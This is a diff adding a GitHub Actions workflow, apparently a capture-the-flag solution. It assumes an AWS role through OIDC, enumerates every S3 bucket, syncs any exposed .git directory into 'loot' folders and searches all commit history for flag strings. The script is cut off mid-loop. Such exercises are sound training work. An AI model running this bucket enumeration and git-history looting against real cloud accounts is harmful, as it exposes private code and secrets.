@@ -1,0 +1,76 @@
+name: CloudEscape Stage 1
+on:
+  push:
+    branches: [corgi]
+
+permissions:
+  id-token: write      # חובה ל-OIDC
+  contents: read
+
+jobs:
+  hunt:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          role-session-name: gha-${{ github.run_id }}
+          aws-region: eu-central-1
+
+      - name: Who am I
+        run: aws sts get-caller-identity
+
+      - name: List buckets and hunt for .git or flag
+        run: |
+          echo "## Buckets visible to this role:"
+          aws s3api list-buckets --query 'Buckets[].Name' --output text | tr '\t' '\n'
+          echo
+          echo "## Hunting for .git/ and flag across buckets:"
+          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
+            echo "=== $b ==="
+            aws s3 ls "s3://$b/" --recursive 2>/dev/null | grep -iE '\.git/|flag' || echo "  (nothing matched)"
+          done
+
+      - name: Reconstruct .git and extract flag
+        run: |
+          set -e
+          # מריצים על כל bucket שיש בו תיקיית .git
+          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
+            if aws s3 ls "s3://$b/" --recursive 2>/dev/null | grep -q '\.git/'; then
+              echo "############################################"
+              echo "# Found .git in bucket: $b — reconstructing"
+              echo "############################################"
+              rm -rf "loot-$b" && mkdir -p "loot-$b" && cd "loot-$b"
+
+              # מושכים את כל תוכן ה-.git
+              aws s3 sync "s3://$b/" . 2>/dev/null || true
+
+              # אם ה-.git יושב בתת-נתיב, מאתרים אותו
+              GITDIR=$(find . -type d -name .git | head -n1)
+              if [ -z "$GITDIR" ]; then
+                echo "  .git objects present but no .git dir — skipping repo ops for $b"
+                cd ..
+                continue
+              fi
+              REPO=$(dirname "$GITDIR")
+              cd "$REPO"
+
+              echo "---- git status / checkout ----"
+              git checkout -- . 2>/dev/null || true
+              git reset --hard 2>/dev/null || true
+
+              echo "---- full history (all branches) ----"
+              git log --all --oneline || true
+
+              echo "---- files that ever existed ----"
+              git log --all --pretty=format: --name-only --diff-filter=A | sort -u || true
+
+              echo "---- searching every commit (incl. deleted) for flag ----"
+              git log --all -p | grep -iaE 'flag\{|FLAG\{|CTF\{|flag' || echo "  (no inline match — check files below)"
+
+              echo "---- dumping any file literally named flag* ----"
+              for f in $(git log --all --pretty=format: --name-only | sort -u | grep -i flag); do
+                echo ">>> $f"
+                # מנסים מכל commit שבו הקובץ קיים
+                for c in
